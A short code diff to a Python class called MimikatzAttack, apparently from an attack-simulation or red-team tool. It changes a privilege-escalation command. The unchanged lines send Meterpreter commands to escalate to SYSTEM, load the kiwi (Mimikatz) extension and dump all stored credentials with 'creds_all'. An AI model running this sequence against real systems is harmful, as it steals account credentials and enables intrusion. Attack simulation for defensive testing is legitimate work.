@@ -72,7 +72,7 @@ class MimikatzAttack(Attack):
 
     def _run_mimikatz(self):
         self.ssh_client.write_lines(self.handler.stdin, [
-            "getsystem -t 2",
+            "getsystem",
             "load kiwi",
             "creds_all",
             "background"])
